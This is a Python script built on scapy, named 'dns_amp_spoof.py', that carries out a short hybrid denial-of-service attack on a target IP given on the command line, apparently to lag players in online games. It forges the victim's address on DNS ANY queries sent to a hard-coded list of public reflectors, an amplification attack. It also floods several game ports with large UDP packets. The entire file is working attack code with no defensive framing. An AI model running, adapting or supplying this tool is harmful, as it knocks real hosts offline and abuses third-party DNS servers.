# dns_amp_spoof.py — 3-second hybrid lag switch burst
import random
import time
import sys
from scapy.all import IP, UDP, send, DNS, DNSQR, Raw

# === CONFIGURATION ===
DURATION = 3  # seconds (true lag switch burst)
RAW_FLOOD_PORTS = [7777, 8000, 9000, 12000]
REFLECTORS = [
    "185.222.222.222", "193.110.157.123", "185.156.175.61",
    "185.130.104.181", "81.95.97.154", "185.26.122.222",
    "89.38.96.160", "176.9.1.117", "37.235.1.174"
]

# === DNS QUERY BUILDER ===
def build_heavy_dns_query():
    qname = ".".join(["a" * 60 for _ in range(5)]) + ".com"
    return DNS(rd=1, id=random.randint(0, 65535), qd=DNSQR(qname=qname, qtype="ANY"))

# === DNS REFLECTION ===
def dns_amplification(target_ip):
    end_time = time.time() + DURATION
    while time.time() < end_time:
        for reflector in REFLECTORS:
            try:
                ip = IP(src=target_ip, dst=reflector)
                udp = UDP(sport=random.randint(1024, 65535), dport=53)
                dns = build_heavy_dns_query()
                packet = ip / udp / dns
                send(packet, verbose=0)
            except Exception as e:
                print(f"[!] DNS Error: {e}")

# === RAW DIRECT UDP FLOOD ===
def raw_udp_flood(target_ip):
    end_time = time.time() + DURATION
    while time.time() < end_time:
        for port in RAW_FLOOD_PORTS:
            try:
                ip = IP(dst=target_ip)
                udp = UDP(sport=random.randint(1024, 65535), dport=port)
                payload = Raw(load=b"X" * 1400)
                packet = ip / udp / payload
                send(packet, verbose=0)
            except Exception as e:
                print(f"[!] RAW Flood Error: {e}")

# === LAUNCH HYBRID ATTACK ===
def launch_attack(target_ip):
    print(f"[+] Launching 3-second lag burst on {target_ip}...")
    from threading import Thread
    Thread(target=dns_amplification, args=(target_ip,), daemon=True).start()
    raw_udp_flood(target_ip)
    print("[+] Lag burst complete.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 dns_amp_spoof.py <target_ip>")
        sys.exit(1)
    launch_attack(sys.argv[1])
